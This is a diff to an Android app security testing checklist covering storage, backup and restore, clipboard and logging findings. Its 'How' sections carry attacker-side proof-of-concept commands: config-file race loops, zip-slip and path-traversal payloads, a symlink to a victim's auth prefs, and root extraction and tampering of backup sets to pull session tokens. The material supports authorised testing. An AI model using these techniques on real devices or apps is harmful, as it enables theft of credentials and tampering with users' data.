@@ -1538,9 +1615,9 @@ Java.perform(function () {
   `preserveLegacyExternalStorage` preserves legacy behaviour only across an *upgrade*, never a fresh install.
 - **How:**
 ```bash
-grep -nE 'MANAGE_EXTERNAL_STORAGE|requestLegacyExternalStorage|preserveLegacyExternalStorage|WRITE_EXTERNAL_STORAGE|READ_MEDIA_' out/AndroidManifest.xml
+grep -nE 'MANAGE_EXTERNAL_STORAGE|requestLegacyExternalStorage|preserveLegacyExternalStorage|WRITE_EXTERNAL_STORAGE|READ_MEDIA_' $DEC/apktool/AndroidManifest.xml
 adb shell dumpsys package $PKG | grep -i MANAGE_EXTERNAL_STORAGE
-grep -rnE 'Environment\.getExternalStorageDirectory|getExternalFilesDir|Environment\.isExternalStorageManager|MediaStore\.' out/sources/
+grep -rnE 'Environment\.getExternalStorageDirectory|getExternalFilesDir|Environment\.isExternalStorageManager|MediaStore\.' $DEC/jadx/sources/
 adb shell find /sdcard -newer /sdcard -type f 2>/dev/null | head -40
 ```
 - **Proof:** A file at a shared-storage path (not under `Android/data/<pkg>`) holding the app's sensitive
@@ -1587,7 +1664,7 @@ adb shell ls /sdcard/Android/data/$PKG/ 2>&1
 | | |
 |---|---|
 | **Severity ceiling** | Medium — path disclosure plus a write whose destination other apps influence |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) for the path leak; MASWE-0002 for the write |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) for the path leak; MASWE-0002 for the write |
 | **Attacker** | AM-03 (other apps create the MediaStore rows) |
 | **Applies to** | API 29+ scoped storage; on API 29 `requestLegacyExternalStorage` re-enables the old behaviour |
 | **Requires** | device |
@@ -1599,7 +1676,7 @@ adb shell ls /sdcard/Android/data/$PKG/ 2>&1
   not guaranteed valid or stable, and other apps create the rows.
 - **How:**
 ```bash
-grep -rnE 'MediaStore\.MediaColumns\.DATA|"_data"|MediaColumns\.RELATIVE_PATH|IS_PENDING|setRequireOriginal|ACCESS_MEDIA_LOCATION' out/sources/
+grep -rnE 'MediaStore\.MediaColumns\.DATA|"_data"|MediaColumns\.RELATIVE_PATH|IS_PENDING|setRequireOriginal|ACCESS_MEDIA_LOCATION' $DEC/jadx/sources/
 adb shell content query --uri content://media/external/images/media --projection _id:_data:relative_path:_display_name | head
 ```
 - **Proof:** The app writing to or reading from a path taken from `_data` (shown by strace-style file access
@@ -1627,7 +1704,7 @@ adb shell content query --uri content://media/external/images/media --projection
   (server JSON, share intent, deep-link parameter).
 - **How:**
 ```bash
-grep -rnA10 'ContentValues()' out/sources/ | grep -nE 'DISPLAY_NAME|RELATIVE_PATH|MIME_TYPE'
+grep -rnA10 'ContentValues()' $DEC/jadx/sources/ | grep -nE 'DISPLAY_NAME|RELATIVE_PATH|MIME_TYPE'
 # plant a file at an attacker-chosen path
 adb shell content insert --uri content://media/external/file \
   --bind _display_name:s:report.pdf --bind relative_path:s:Download/ --bind mime_type:s:application/pdf
@@ -1657,7 +1734,7 @@ adb shell content query --uri content://media/external/file --projection _displa
   external storage? Any other app with storage permission can swap it between the app's write and its read.
 - **How:**
 ```bash
-grep -rn 'getExternalFilesDir\|/sdcard\|Environment\.getExternalStorage' out/sources/ -A6 | \
+grep -rn 'getExternalFilesDir\|/sdcard\|Environment\.getExternalStorage' $DEC/jadx/sources/ -A6 | \
   grep -nE 'DexClassLoader|System\.load|ZipFile|unzip|JSONObject|Gson|readObject|BitmapFactory|Properties'
 # race the read
 while :; do cp evil.json /sdcard/Android/data/$PKG/files/config.json; done
@@ -1688,8 +1765,8 @@ while :; do cp evil.json /sdcard/Android/data/$PKG/files/config.json; done
   whole process.
 - **How:**
 ```bash
-grep -rn 'ZipPathValidator\|clearCallback' out/sources/
-grep -rn 'ZipInputStream\|ZipFile\|getNextEntry' out/sources/ -A6 | grep -nE 'getName\(\)|new File\('
+grep -rn 'ZipPathValidator\|clearCallback' $DEC/jadx/sources/
+grep -rn 'ZipInputStream\|ZipFile\|getNextEntry' $DEC/jadx/sources/ -A6 | grep -nE 'getName\(\)|new File\('
 python3 - <<'PY'
 import zipfile
 z = zipfile.ZipFile('evil.zip','w')
@@ -1732,7 +1809,7 @@ adb shell run-as $PKG ls shared_prefs/
 Content-Disposition: attachment; filename="../../../lib-1/libjnigraphics.so"
 ```
 ```bash
-grep -rnE 'Content-Disposition|getLastPathSegment\(\)|OpenableColumns|DISPLAY_NAME|guessFileName|getHeaderField\("Content-Disposition"' out/sources/
+grep -rnE 'Content-Disposition|getLastPathSegment\(\)|OpenableColumns|DISPLAY_NAME|guessFileName|getHeaderField\("Content-Disposition"' $DEC/jadx/sources/
 ```
   Evernote #1377748: the attacker set the name via the product's own attachment-rename feature (special
   characters not restricted), shared the note, and the victim's download wrote to
@@ -1755,9 +1832,10 @@ grep -rnE 'Content-Disposition|getLastPathSegment\(\)|OpenableColumns|DISPLAY_NA
 | **Severity ceiling** | High–Critical — arbitrary private-file read/write with the app's UID |
 | **VRT** | outcome-rated: `server_side_injection.file_inclusion.local` (P1) analogue |
 | **Attacker** | AM-03 (a symlink in a shared directory); AM-02 via a `file://` share |
-| **Applies to** | all; the `StrictMode` LAX bypass defeats "we're on targetSdk 30, `file://` can't reach us" |
+| **Applies to** | private-dir target via `file://`: **LEGACY** — dead for victims with targetSdk >= 28 on Android 9+ (per-app SELinux categories); the descriptor/`content://` TOCTOU half (validate-the-path-then-open) is current on every version and is the same class as D07-037. The `StrictMode` LAX bypass defeats "we're on targetSdk 30, `file://` can't reach us" only for the delivery, not for the SELinux boundary |
 | **Requires** | device, legacy, targetsdk<28 |
 | **Maps to** | `developer.android.com/privacy-and-security/risks/content-resolver` (the five-step fstat/lstat validation algorithm; explicit mention of symlinks and race conditions); Oversecured "theft of arbitrary files" (`file://` vector, `FileUriExposedException` at targetSdk >= 18, and the `StrictMode.setVmPolicy(...LAX)` bypass); H1 #288955 (IRCCloud, symlink + `shared_prefs/prefs.xml` -> `session_key`) |
+| **Record** | `logs/D11-049.txt`; provider variant in D07-037, cookie-DB variant in D10-038 — file the class once and cross-reference |
 
 - **Test:** If the app validates a path *string* and then opens it later, swap the path for a symlink in
   between. Google's own guidance describes it directly: symlinks targeting app internal files, and "race
@@ -1767,9 +1845,15 @@ grep -rnE 'Content-Disposition|getLastPathSegment\(\)|OpenableColumns|DISPLAY_NA
   validate-the-**descriptor**.
 - **How:**
 ```bash
-grep -rnE 'getCanonicalPath|canonicalFile|startsWith\(|openFileDescriptor|openInputStream|openAssetFileDescriptor|ParcelFileDescriptor\.open' out/sources/
-# attacker side, in shared storage
-ln -s /data/data/com.target.app/shared_prefs/auth.xml /sdcard/Download/benign.jpg
+grep -rnE 'getCanonicalPath|canonicalFile|startsWith\(|openFileDescriptor|openInputStream|openAssetFileDescriptor|ParcelFileDescriptor\.open' $DEC/jadx/sources/
+```
+```java
+// attacker app (not adb): the symlink lives in the attacker's OWN private dir and is handed over as file:// or an FD.
+// Emulated /sdcard (FUSE/sdcardfs) rejects symlinks outright, so `ln -s ... /sdcard/Download/x.jpg` from a shell proves nothing.
+File d = new File(getFilesDir(), "x"); d.mkdirs();
+android.system.Os.symlink("/data/data/" + VICTIM + "/shared_prefs/auth.xml", new File(d, "benign.jpg").getPath());
+// chmod 0711 every path component so the victim UID can traverse. On Android 9+ per-app SELinux MLS categories deny the
+// cross-UID open of app_data_file regardless of DAC bits: the private-dir target is LEGACY (victim targetSdk < 28).
 ```
   The IRCCloud PoC combines the percent-decode escape with an owned symlink: create a deep path, symlink
   `shared_prefs/prefs.xml` into it, grant world permissions, and send a `file://` URI to the app's share
@@ -1781,7 +1865,8 @@ ln -s /data/data/com.target.app/shared_prefs/auth.xml /sdcard/Download/benign.jp
   `file://` delivery).
 - **Ruled out when:** The app validates the open **descriptor** (fstat/lstat inode comparison) rather than
   the path string, or refuses `file://` inputs and only accepts `content://` with a resolver check. Show the
-  symlink read failing.
+  symlink read failing. For the `file://` private-dir variant, a victim targetSdk >= 28 on an Android 9+ device closes
+  it by platform (per-app SELinux categories) — record that, and still run the descriptor half.
 
 ### D11-050 · Data written to a hidden `.nomedia` directory the user cannot see or manage
 
@@ -1799,7 +1884,7 @@ ln -s /data/data/com.target.app/shared_prefs/auth.xml /sdcard/Download/benign.jp
 - **How:**
 ```bash
 adb shell find /sdcard -name '.nomedia' -o -type d -name '.*' 2>/dev/null | head
-grep -rnE '\.nomedia|MediaScannerConnection|MediaStore\.MediaColumns\.IS_PENDING' out/sources/
+grep -rnE '\.nomedia|MediaScannerConnection|MediaStore\.MediaColumns\.IS_PENDING' $DEC/jadx/sources/
 ```
 - **Proof:** A directory containing user-identifiable captures alongside a `.nomedia` marker, invisible in
   the Gallery but present on disk — show both the `ls` and the empty Gallery.
@@ -1813,10 +1898,11 @@ grep -rnE '\.nomedia|MediaScannerConnection|MediaStore\.MediaColumns\.IS_PENDING
 |---|---|
 | **Severity ceiling** | High when a session token or PII file is restorable; the flag alone is P5 |
 | **VRT** | `mobile_security_misconfiguration.auto_backup_allowed_by_default` (**P5**) for the flag; file the extracted-and-replayed credential instead |
-| **Attacker** | AM-11 physical unlocked with ADB; AM-11 with the user's backup account |
+| **Attacker** | AM-11 physical unlocked (the D2D transfer to an attacker-controlled device, D11-052/054); AM-12 rooted/AVD only as the local-transport extraction rig; an attacker holding only the cloud account cannot restore — cloud backups are end-to-end encrypted with the lock-screen credential since Android 9 |
 | **Applies to** | all; `dataExtractionRules` is the targetSdk 31+ form, `fullBackupContent` the pre-31 form — an app targeting 12+ needs both |
 | **Requires** | device, root |
-| **Maps to** | MASTG-TEST-0009, MASTG-TEST-0216, MASTG-TEST-0262, MASTG-TECH-0127, MASTG-TECH-0128, MASWE-0006, MASTG-KNOW-0050, MASTG-BEST-0004; VRT `auto_backup_allowed_by_default` (P5); H1 #1225158 (Zivver, $0 — the flag was the whole report) |
+| **Maps to** | MASTG-TEST-0216, MASTG-TEST-0262, MASTG-TEST-0009 (deprecated — superseded by MASTG-TEST-0216/0262), MASTG-TECH-0127, MASTG-TECH-0128, MASWE-0006, MASTG-KNOW-0050, MASTG-BEST-0004; VRT `auto_backup_allowed_by_default` (P5); H1 #1225158 (Zivver, $0 — the flag was the whole report) |
+| **Record** | `logs/D11-051.txt`; manifest half settled in D03-068/D03-069 — this item owns the extraction and replay; mark the other row `covered-by` with the log path |
 
 - **Test:** `allowBackup="true"` (or unset, which defaults true) is **not** a finding. Auto Backup always
   *excludes* `getCacheDir()`, `getCodeCacheDir()` and `getNoBackupFilesDir()`; everything else under
@@ -1825,9 +1911,9 @@ grep -rnE '\.nomedia|MediaScannerConnection|MediaStore\.MediaColumns\.IS_PENDING
   excluded; then extract and prove which secret came out.
 - **How:**
 ```bash
-grep -nE 'allowBackup|fullBackupContent|dataExtractionRules|backupAgent|fullBackupOnly' out/AndroidManifest.xml
-cat out/res/xml/*backup*.xml out/res/xml/*extraction*.xml 2>/dev/null
-# modern extraction — bmgr local transport, no debuggable flag needed (MASTG-TECH-0128)
+grep -nE 'allowBackup|fullBackupContent|dataExtractionRules|backupAgent|fullBackupOnly' $DEC/apktool/AndroidManifest.xml
+cat $DEC/apktool/res/xml/*backup*.xml $DEC/apktool/res/xml/*extraction*.xml 2>/dev/null
+# extraction rig (rooted AVD/userdebug): bmgr local transport — no debuggable flag, but root to read the transport's set (MASTG-TECH-0128)
 adb shell bmgr enable true
 adb shell bmgr transport com.android.localtransport/.LocalTransport
 adb shell bmgr backupnow $PKG
@@ -1843,7 +1929,8 @@ pax -r < app.tar   # star -x also works; GNU tar and 7-Zip FAIL (abe writes dir 
   (not stored), `_manifest`.
 - **Proof:** A `sp/` or `db/` entry containing a token, plus a successful replay of that token against the
   production API. **A failed or empty backup is a platform property, not an app property — evidence in
-  neither direction.**
+  neither direction.** On a stock device with a release build there is no local extraction path: the exposure proof
+  is the D2D restore onto a second device (D11-052/D11-054), not this pull.
 - **Escalation:** -> D11-053 (modify-and-restore); -> D13 (restored token authenticates on an attacker
   device = ATO); -> the macOS trap: LibreSSL has no `openssl zlib` subcommand, so the failure reads like a
   corrupt archive — use the Python `zlib.decompress` above.
@@ -1861,7 +1948,8 @@ pax -r < app.tar   # star -x also works; GNU tar and 7-Zip FAIL (abe writes dir 
 | **Attacker** | AM-11 physical (device resale, repair shop, coerced migration) |
 | **Applies to** | targetSdk >= 31; check the pre-31 `fullBackupContent` too |
 | **Requires** | device |
-| **Maps to** | `developer.android.com/guide/topics/data/autobackup` (the `<cloud-backup>` / `<device-transfer>` schema and the rule that a missing section means fully enabled); `developer.android.com/guide/topics/data/testingbackup`; MASWE-0006, MASTG-TEST-0009 |
+| **Maps to** | `developer.android.com/guide/topics/data/autobackup` (the `<cloud-backup>` / `<device-transfer>` schema and the rule that a missing section means fully enabled); `developer.android.com/guide/topics/data/testingbackup`; MASWE-0006, MASTG-TEST-0216, MASTG-TEST-0262, MASTG-TEST-0009 (deprecated — superseded by MASTG-TEST-0216/0262) |
+| **Record** | `logs/D11-052.txt`; the rules split is also read in D03-069 — this item owns the D2D run; whichever runs second is `covered-by` the first's log |
 
 - **Test:** Android 12+ `dataExtractionRules` splits `<cloud-backup>` from `<device-transfer>`, and **if a
   section is missing, that mode is fully enabled** for all content except `no-backup` and `cache`. A very
@@ -1870,8 +1958,8 @@ pax -r < app.tar   # star -x also works; GNU tar and 7-Zip FAIL (abe writes dir 
   `android:allowBackup="false"` "may not disable D2D on some devices" per the docs.
 - **How:**
 ```bash
-grep -nE 'android:dataExtractionRules|android:fullBackupContent|android:allowBackup|android:backupAgent' out/AndroidManifest.xml
-cat out/res/xml/*extraction*.xml out/res/xml/*backup*.xml 2>/dev/null
+grep -nE 'android:dataExtractionRules|android:fullBackupContent|android:allowBackup|android:backupAgent' $DEC/apktool/AndroidManifest.xml
+cat $DEC/apktool/res/xml/*extraction*.xml $DEC/apktool/res/xml/*backup*.xml 2>/dev/null
 # exercise the D2D path explicitly
 adb shell settings put secure backup_enable_d2d_test_mode 1
 adb shell bmgr transport com.google.android.gms/.backup.migrate.service.D2dTransport
@@ -1902,6 +1990,7 @@ adb shell bmgr transport com.google.android.gms/.backup.BackupTransportService
 | **Applies to** | same `[DEGRADED ≤A11 / bmgr on 12+]` gating as D11-051 |
 | **Requires** | device, root |
 | **Maps to** | MASTG-TECH-0128; MASWE-0006 |
+| **Record** | `logs/D11-053.txt`; D03-070 is the same primitive (restore as a write); whichever runs second is `covered-by` |
 
 - **Test:** Flip a value in the backup set and restore it, then show the app honouring the tampered value.
   For the legacy `adb` archive the file order must be preserved or the restore is rejected; for the modern
@@ -1914,10 +2003,16 @@ tar -tf app.tar > app.list
 star -c -v -f new.tar -no-dirslash list=app.list
 java -jar abe.jar pack-kk new.tar new.ab          # pack-kk for 4.4.3+; 'pack' for older
 adb restore new.ab
-# modern (non-debuggable): edit in the local-transport set, then reinstall
-adb shell run-as $PKG cat shared_prefs/config.xml > config.xml   # edit it
-adb shell run-as $PKG cp /sdcard/config.xml shared_prefs/config.xml
-adb shell pm uninstall --user 0 $PKG && adb install-multiple -t --user 0 base.apk split_*.apk
+# modern: modify the LOCAL-TRANSPORT SET and restore it (rooted AVD/userdebug) — this is restore-as-write-primitive
+adb shell bmgr enable true && adb shell bmgr transport com.android.localtransport/.LocalTransport && adb shell bmgr backupnow "$PKG"
+adb root && adb pull /data/data/com.android.localtransport/files/1/_full/"$PKG" full.tar      # full-data set (K/V agents: files/1/<pkg>/)
+mkdir set && tar -xf full.tar -C set && tar -tf full.tar > order.txt
+# edit set/apps/$PKG/sp/<prefs>.xml with python/perl (never an in-place sed: GNU and BSD differ), keep the member order:
+(cd set && tar -cf ../full.mod.tar -T ../order.txt)
+adb push full.mod.tar /data/data/com.android.localtransport/files/1/_full/"$PKG"
+adb shell pm uninstall --user 0 "$PKG" && adb install-multiple -t --user 0 base.apk split_*.apk   # restore-at-install
+adb shell bmgr restore 1 "$PKG"                                                                 # explicit restore if it did not fire
+# direct write (DEBUGGABLE builds only — not a restore, label it as such): adb push x.xml /data/local/tmp/ && adb shell run-as "$PKG" cp /data/local/tmp/x.xml shared_prefs/
 ```
 - **Proof:** A screen recording of the app after restore showing the entitlement/PIN state you wrote (the
   gated screen opening, the premium tier live), with no server round-trip that corrects it.
@@ -1947,17 +2042,23 @@ adb shell pm uninstall --user 0 $PKG && adb install-multiple -t --user 0 base.ap
   `android_id`-equality check is a same-device heuristic, not authentication, and it is *frequently inverted*.
 - **How:**
 ```bash
-grep -rnE 'ANDROID_ID|Settings\.Secure\.getString|onRestoreFinished|BackupAgent|onRestore\(|getSerial|installUuid|device_id' out/sources/ -A6
-# capture backup on device A, restore onto device B (different ANDROID_ID) via D2D between two emulators
-adb -s A shell bmgr transport com.android.localtransport/.LocalTransport
-adb -s A shell bmgr backupnow $PKG
-adb -s B shell pm uninstall --user 0 $PKG && adb -s B install base.apk
-adb -s B logcat -s TargetApp | grep -iE 'restore|device id|mismatch'
+grep -rnE 'ANDROID_ID|Settings\.Secure\.getString|onRestoreFinished|BackupAgent|onRestore\(|getSerial|installUuid|device_id' $DEC/jadx/sources/ -A6
+# capture the backup set on device A and MOVE it to device B (different ANDROID_ID): a reinstall on B alone restores nothing
+adb -s "$A" shell 'bmgr enable true; bmgr transport com.android.localtransport/.LocalTransport' && adb -s "$A" shell bmgr backupnow "$PKG"
+adb -s "$A" root && adb -s "$A" pull /data/data/com.android.localtransport/files/1 setA/
+adb -s "$B" root && adb -s "$B" shell 'bmgr enable true; bmgr transport com.android.localtransport/.LocalTransport'
+adb -s "$B" shell ls -ln /data/data/com.android.localtransport/files/     # note the owner uid:gid, then
+adb -s "$B" push setA/ /data/data/com.android.localtransport/files/1 && adb -s "$B" shell chown -R <uid>:<gid> /data/data/com.android.localtransport/files/1
+adb -s "$B" shell pm uninstall --user 0 "$PKG"; adb -s "$B" install-multiple -t --user 0 base.apk split_*.apk
+adb -s "$B" shell bmgr restore 1 "$PKG"                                   # token 1 = the local transport's current set
+adb -s "$B" shell dumpsys backup | grep -iA3 'restore'                     # the restore must have COMPLETED before any wipe/keep observation counts
+adb -s "$B" logcat -d | grep -iE 'restore|device.?id|mismatch'
 ```
 - **Proof:** Device B making an authenticated request with device A's session, captured in the proxy —
   confirmed if B's app authenticates or decrypts with A's secret; refuted if it wipes. Show both the guard's
   code and the differential two-device run. **Mark HYPOTHESIS in the report until the two-device experiment
-  runs.**
+  runs.** `dumpsys backup` on B must show the restore completed — 'guard fired / secret wiped' with no completed
+  restore is the systematic false negative of this item.
 - **Escalation:** -> D13 (portable credential = ATO); -> D11-056 (the same restore path plants control-plane
   values).
 - **Ruled out when:** The two-device restore wipes the secret on the receiving device (the guard fires
@@ -1982,7 +2083,7 @@ adb -s B logcat -s TargetApp | grep -iE 'restore|device id|mismatch'
   `shared_prefs` is not.
 - **How:**
 ```bash
-grep -rn 'BackupAgent\|onFullBackup\|FullBackupDataOutput\|onRestore' out/sources/
+grep -rn 'BackupAgent\|onFullBackup\|FullBackupDataOutput\|onRestore' $DEC/jadx/sources/
 adb shell run-as $PKG find files -type f -newer shared_prefs
 strings pulled/files/* | grep -iE 'eyJ|bearer|access_token|refresh'
 ```
@@ -2004,6 +2105,7 @@ strings pulled/files/* | grep -iE 'eyJ|bearer|access_token|refresh'
 | **Applies to** | all apps with `allowBackup` effectively true that read config from storage |
 | **Requires** | device, root |
 | **Maps to** | `developer.android.com/privacy-and-security/risks/backup-best-practices`; MASWE-0006, MASWE-0050; restore semantics ("Restore happens after APK installation but before user can launch app") |
+| **Record** | `logs/D11-056.txt`; D03-070 is the same primitive; whichever runs second is `covered-by`, the finding is filed once |
 
 - **Test:** The high-value inversion of "is my token backed up". Look for values in backed-up storage the
   app *trusts on next launch* rather than merely reads: API base URL / host map, remote-config cache,
@@ -2015,10 +2117,10 @@ strings pulled/files/* | grep -iE 'eyJ|bearer|access_token|refresh'
 ```bash
 adb shell bmgr transport com.android.localtransport/.LocalTransport && adb shell bmgr backupnow $PKG
 adb shell run-as $PKG find . -name '*.xml' -o -name '*.json' -o -name '*.db' 2>/dev/null
-grep -rnE 'BASE_URL|baseUrl|api_host|endpoint|remote_config|firebase_remote|feature_flag|flags\.json|pin_set|cert_pins|kill_switch|is_rooted|device_trusted|onboarding_complete' out/sources/
-# trace each control-plane key back to storage, confirm it is in the backup set, then modify+restore
-adb shell run-as $PKG cat shared_prefs/config.xml > config.xml   # edit host, then:
-adb shell run-as $PKG cp /sdcard/config.xml shared_prefs/config.xml
+grep -rnE 'BASE_URL|baseUrl|api_host|endpoint|remote_config|firebase_remote|feature_flag|flags\.json|pin_set|cert_pins|kill_switch|is_rooted|device_trusted|onboarding_complete' $DEC/jadx/sources/
+# trace each control-plane key back to storage, confirm it is in the backup set, then modify+restore THROUGH THE TRANSPORT
+# (the local-transport edit-and-restore sequence is in D11-053; `run-as cp` from /sdcard is neither a restore nor possible on a release build)
+adb exec-out run-as "$PKG" cat shared_prefs/config.xml > config.xml   # read the current host value; edit it inside the pulled set (D11-053)
 adb shell am force-stop $PKG && adb shell monkey -p $PKG 1
 ```
 - **Proof:** The app's first outbound request after restore goes to the attacker-chosen host (proxy log), or
@@ -2049,8 +2151,8 @@ adb shell am force-stop $PKG && adb shell monkey -p $PKG 1
   not know the SDK wrote them (D11-028).
 - **How:**
 ```bash
-grep -nE 'allowBackup|fullBackupContent|dataExtractionRules' out/AndroidManifest.xml
-cat out/res/xml/backup_rules*.xml out/res/xml/data_extraction_rules*.xml 2>/dev/null
+grep -nE 'allowBackup|fullBackupContent|dataExtractionRules' $DEC/apktool/AndroidManifest.xml
+cat $DEC/apktool/res/xml/backup_rules*.xml $DEC/apktool/res/xml/data_extraction_rules*.xml 2>/dev/null
 adb shell bmgr transport com.android.localtransport/.LocalTransport && adb shell bmgr backupnow $PKG
 adb root && tar xf /data/data/com.android.localtransport/files/1/_full/$PKG -C loot 2>/dev/null
 grep -REi 'shared_prefs|databases' loot/ | grep -iE 'token|refresh|session'
@@ -2075,7 +2177,9 @@ grep -REi 'shared_prefs|databases' loot/ | grep -iE 'token|refresh|session'
 - **Test:** Most teams never test backup because the rig is fiddly, so they silently skip the highest-ceiling
   storage items. Stand it up once. Note Android 12 excludes app data from `adb backup` unless
   `android:debuggable="true"`, so `adb backup` is **LEGACY** as an extraction technique and `bmgr` + the
-  local/D2D transport is the current one.
+  local/D2D transport is the current one. Observed on an API 35 LocalTransport: `is_device_transfer=true` changed the
+  flags the agent saw; the encryption-flag parameter did not. Never infer the transport mode from the setting — read
+  it back from an agent, or a D2D/encryption-mode negative is recorded while the transport was still in cloud mode.
 - **How:**
 ```bash
 # cloud path
@@ -2085,6 +2189,11 @@ adb shell bmgr transport com.android.localtransport/.LocalTransport
 adb shell settings put secure backup_local_transport_parameters 'is_encrypted=true'
 adb shell bmgr backupnow $PKG
 adb shell dumpsys backup
+# every transport parameter must be validated by a positive control — a setting can silently not apply
+adb shell settings put secure backup_local_transport_parameters 'is_device_transfer=true'
+adb shell bmgr backupnow "$PKG"
+adb logcat -d -s BackupManagerService LocalTransport | grep -iE 'transport flags|device.transfer|encrypt' | tail -5
+# the reliable control: a helper app whose BackupAgent logs getBackupTransportFlags() / the onFullBackup flags, run in the same set
 # device-to-device path
 adb shell settings put secure backup_enable_d2d_test_mode 1
 adb shell bmgr transport com.google.android.gms/.backup.migrate.service.D2dTransport
@@ -2120,8 +2229,8 @@ adb shell bmgr transport com.google.android.gms/.backup.BackupTransportService
   developer-side defect to name.
 - **How:**
 ```bash
-grep -rnE 'ClipboardManager|setPrimaryClip|ClipData\.newPlainText|EXTRA_IS_SENSITIVE|OnPrimaryClipChangedListener' out/sources/
-grep -rn 'EXTRA_IS_SENSITIVE\|android.content.extra.IS_SENSITIVE' out/sources/   # absence is the finding
+grep -rnE 'ClipboardManager|setPrimaryClip|ClipData\.newPlainText|EXTRA_IS_SENSITIVE|OnPrimaryClipChangedListener' $DEC/jadx/sources/
+grep -rn 'EXTRA_IS_SENSITIVE\|android.content.extra.IS_SENSITIVE' $DEC/jadx/sources/   # absence is the finding
 adb shell service call clipboard 1 s16 com.attacker 2>/dev/null | head          # read attempt (OEM/API-varying)
 ```
 ```javascript
@@ -2153,7 +2262,7 @@ Log.e("PoC", cm.getPrimaryClip().getItemAt(0).getText().toString());
 | | |
 |---|---|
 | **Severity ceiling** | High when transmitted clipboard contents are a password-manager paste or a 2FA code |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) for the transmission; the read itself is P5 |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) for the transmission; the read itself is P5 |
 | **Attacker** | AM-08 (the target app, or an SDK inside it, is the reader — the app is misbehaving; tested from the defender's side) |
 | **Applies to** | Android 12+ (the toast makes a silent-launch read detectable) |
 | **Requires** | device |
@@ -2203,8 +2312,8 @@ Java.perform(function () {
   TYPE_TEXT_FLAG_NO_SUGGESTIONS`.
 - **How:**
 ```bash
-grep -rn 'android:inputType' out/res/layout/ | grep -viE 'textPassword|textVisiblePassword|textWebPassword|numberPassword|textNoSuggestions'
-grep -rnE 'setInputType\(|KeyboardOptions\(|keyboardType\s*=|SecureTextField|TextObfuscationMode|IME_FLAG_NO_PERSONALIZED_LEARNING' out/sources/
+grep -rn 'android:inputType' $DEC/apktool/res/layout/ | grep -viE 'textPassword|textVisiblePassword|textWebPassword|numberPassword|textNoSuggestions'
+grep -rnE 'setInputType\(|KeyboardOptions\(|keyboardType\s*=|SecureTextField|TextObfuscationMode|IME_FLAG_NO_PERSONALIZED_LEARNING' $DEC/jadx/sources/
 # rooted confirmation of the IME dictionary
 adb shell ls -l /data/data/com.google.android.inputmethod.latin/databases/ 2>/dev/null
 ```
@@ -2223,7 +2332,7 @@ adb shell ls -l /data/data/com.google.android.inputmethod.latin/databases/ 2>/de
 | | |
 |---|---|
 | **Severity ceiling** | Medium local-only on a modern device; High when written to shared storage or shipped by a crash/analytics SDK |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets` (VARIES); the base observation is not a finding |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets` (varies); the base observation is not a finding |
 | **Attacker** | AM-04 (a `READ_LOGS`-holding OEM preload); AM-08 (a log-shipping SDK); AM-11 (ADB) |
 | **Applies to** | Cross-app `READ_LOGS` is **LEGACY (pre-Android 4.1)** for ordinary apps — state the reader |
 | **Requires** | device |
@@ -2232,12 +2341,18 @@ adb shell ls -l /data/data/com.google.android.inputmethod.latin/databases/ 2>/de
 - **Test:** "The app logs to logcat" is not a finding — since Android 4.1 apps read only their own logs. It
   becomes a finding when the logged secret is reachable by another principal: a privileged OEM preload with
   `READ_LOGS`, a crash/analytics SDK that uploads breadcrumbs, a value additionally written to a
-  world-readable file, or an ADB-capable attacker. Capture the app's own PID while typing canary values.
+  world-readable file, or an ADB-capable attacker. Capture the app's own PID while typing canary values. The sweep
+  needs a positive control: the ring buffer rotates within minutes on a busy device, and some stock builds (API 35/36)
+  drop app-level `Log.*` from the shell-visible logcat entirely — if the Frida `Log` hook fires but `adb logcat` shows
+  nothing, the observer is the hook (or a probe mirroring to `getExternalFilesDir`), not logcat. Android 13+ also gates
+  `READ_LOGS` holders behind a user consent dialog — name it when the reader is a preload.
 - **How:**
 ```bash
-adb logcat -c
-adb logcat --pid=$(adb shell pidof -s $PKG) -v time | grep -iE 'token|bearer|passw|pin|otp|authorization|eyJ|card|cvv|ssn|CANARY123'
-grep -rnE 'android\.util\.Log|Log\.(v|d|i|w|e)\(|System\.out\.print|printStackTrace\(|Timber\.' out/sources/ | grep -iE 'token|password|otp|card'
+adb logcat -G 16M && adb logcat -c                                   # enlarge the ring first; a busy device rotates it in minutes
+adb shell log -t D11CANARY "d11-positive-control-$(date +%s)"       # shell-side positive control
+adb logcat --pid=$(adb shell pidof -s "$PKG") -v time | grep -iE 'token|bearer|passw|pin|otp|authorization|eyJ|card|cvv|ssn|CANARY123'
+adb logcat -d -s D11CANARY | grep -c positive-control                # 0 => the capture is invalid; do not record a negative
+grep -rnE 'android\.util\.Log|Log\.(v|d|i|w|e)\(|System\.out\.print|printStackTrace\(|Timber\.' $DEC/jadx/sources/ | grep -iE 'token|password|otp|card'
 ```
 ```javascript
 Java.perform(function () {
@@ -2253,7 +2368,9 @@ Java.perform(function () {
   the same log to a world-readable file, or a documented OEM preload holding `READ_LOGS`.
 - **Escalation:** Crash-reporting SDKs (Crashlytics, Sentry, Bugsnag) upload breadcrumb logs -> a token in
   logcat leaves the device entirely (D18/D20 third-party disclosure).
-- **Ruled out when:** No canary reaches logcat on a release build, or the only logged values are
+- **Ruled out when:** The shell canary AND an app-side canary (the `Log` hook or a debug-build line) are present in
+  the same capture — otherwise the capture is invalid, not negative — and no canary credential reaches logcat on a
+  release build, or the only logged values are
   non-sensitive, or no reader path exists (no log-shipping SDK, no world-readable log file, modern OS with no
   `READ_LOGS` preload). "The app logs a token but nobody else can read it" is informational — say so rather
   than filing it.
@@ -2263,7 +2380,7 @@ Java.perform(function () {
 | | |
 |---|---|
 | **Severity ceiling** | Low; contributes to D11-062 |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets` (VARIES) only if it leaks a secret |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets` (varies) only if it leaks a secret |
 | **Attacker** | AM-11; AM-04 |
 | **Applies to** | all; check ORM debug logging too |
 | **Requires** | device |
@@ -2273,8 +2390,8 @@ Java.perform(function () {
   violations) to the log; ORM debug logging (`setLogLevel`, `enableLogging`) prints queries and rows.
 - **How:**
 ```bash
